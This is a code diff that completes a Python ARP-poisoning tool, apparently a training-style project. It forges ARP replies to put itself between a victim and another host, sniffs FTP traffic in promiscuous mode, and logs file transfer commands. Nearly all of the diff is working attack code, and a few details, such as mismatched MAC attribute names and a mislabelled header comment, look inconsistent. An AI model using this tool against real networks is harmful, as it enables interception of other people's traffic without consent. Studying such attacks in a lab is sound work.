@@ -1,11 +1,14 @@
 from netaddr import EUI, IPAddress
 import socket
+import struct
+import pcap
+import dpkt
 
 
 class Inquisitor:
     usage = "./inquisitor <IP-src> <MAC-src> <IP-target> <MAC-target>\n\n\
-    - <IP-src> The IPv4 address of the machine attacking\n\
-    - <MAC-src> The MAC address of the machine attacking\n\
+    - <IP-src> The IPv4 address of the machine to impersonate\n\
+    - <MAC-src> The MAC address of the machine to impersonate\n\
     - <IP-target> The IPv4 address of the victim machine\n\
     - <MAC-target> The MAC address of the victim machine\n"
 
@@ -26,34 +29,27 @@ class Inquisitor:
             print(str(e) + "\n" + self.usage)
 
     @staticmethod
-    def create_ARP_packet(ip, mac):
+    def _create_ARP_packet(sender_ip, sender_mac, target_ip, target_mac):
         """
         Return an ARP packet response 
         """
-        # source_mac = binascii.unhexlify('00:A0:C9:14:C8:29'.replace(':', ''))
-        # #b'\x00\x00\x00\x00\x00\x00' sender mac address
-        # dest_mac = binascii.unhexlify('ff:ff:ff:ff:ff:ff'.replace(':', ''))
-        # #  b'\xff\xff\xff\xff\xff\xff'  target mac address
+        # ARP header = target_mac + sender_mac + ethernet_type (ARP)
+        header = target_mac.packed + sender_mac.packed + struct.pack("!H", 0x0806)
 
-        # source_ip = "192.168.100.3"  # sender ip address
-        # dest_ip = "192.168.100.1"  # target ip address
+        payload = struct.pack(
+            "!HHBBH6s4s6s4s",
+            1,                      # Hardware type (Ethernet)
+            0x0800,                 # Protocol type (IPv4)
+            6,                      # Hardware size
+            4,                      # Protocol size
+            2,                      # Opcode (2 = reply)
+            sender_mac.packed,      # sender_mac
+            sender_ip.packed,       # sender_ip
+            target_mac.packed,      # target_mac
+            target_ip.packed,       # target_ip
+        )
+        return header + payload
 
-        # Ethernet Header
-        protocol = 0x0806  # 0x0806 for ARP
-        eth_hdr = struct.pack("!6s6sH", dest_mac, source_mac, protocol)
-
-        # # ARP header
-        # htype = 1  # Hardware_type ethernet
-        # ptype = 0x0800  # Protocol type TCP
-        # hlen = 6  # Hardware address Len
-        # plen = 4  # Protocol addr. len
-        # operation = 1  # 1=request/2=reply
-        # src_ip = socket.inet_aton(source_ip)
-        # dst_ip = socket.inet_aton(dest_ip)
-        # arp_hdr = struct.pack("!HHBBH6s4s6s4s", htype, ptype, hlen, plen, operation,
-        #                     source_mac, src_ip, dest_mac, dst_ip)
-
-        # packet = eth_hdr + arp_hdr
 
     def connect(self):
         """
@@ -68,22 +64,51 @@ class Inquisitor:
         ARP_PROTOCOL = socket.htons(socket.ETHERTYPE_ARP)
         # socket is a raw socket that will ONLY receive/send ARP packets
         self.socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, ARP_PROTOCOL)
-        self.socket.bind(("wlp5s0", 0))
+        self.socket.bind(("eth0", 0)) # or try 'wlp5s0'
 
     def poison(self):
         """
         Send ARP response to src and target with attacker MAC
         """
+        # Impersonating source to target
+        packet = self._create_ARP_packet(self.src_ip, self.my_mac, self.tg_ip, self.target_mac)
+        self.socket.send(packet)
+
+        # Impersonating target to source
+        packet = self._create_ARP_packet(self.tg_ip, self.my_mac, self.src_ip, self.src_mac)
+        self.socket.send(packet)
 
     def intercept(self):
         """
         Intercept the packets and display file name
         """
+        cap = pcap.pcap(name=None, promisc=True, immediate=True, timeout_ms=50)
+        cap.setfilter('tcp port 21') # FTP default port
+
+        for timestamp, packet in cap:
+            try:
+                eth = dpkt.ethernet.Ethernet(packet)
+                if isinstance(eth.data, dpkt.ip.IP) and isinstance(eth.data.data, dpkt.tcp.TCP):
+                    ip = eth.data
+                    tcp = ip.data
+                    data = tcp.data.decode(errors='ignore')
+                    for line in data.splitlines():
+                        if line.startswith(('RETR', 'STOR', 'LIST')):
+                            print(f"{timestamp} - {line}")
+            except Exception:
+                continue
 
     def restore(self):
         """
         Send the ARP response with correct addresses to restore the ARP tables
         """
+        # Restoring source to target
+        packet = self._create_ARP_packet(self.src_ip, self.src_mac, self.tg_ip, self.target_mac)
+        self.socket.send(packet)
+
+        # Restoring target to source
+        packet = self._create_ARP_packet(self.tg_ip, self.tg_mac, self.src_ip, self.src_mac)
+        self.socket.send(packet)
 
         # Close the socket if it exists
         self.socket and self.socket.close()
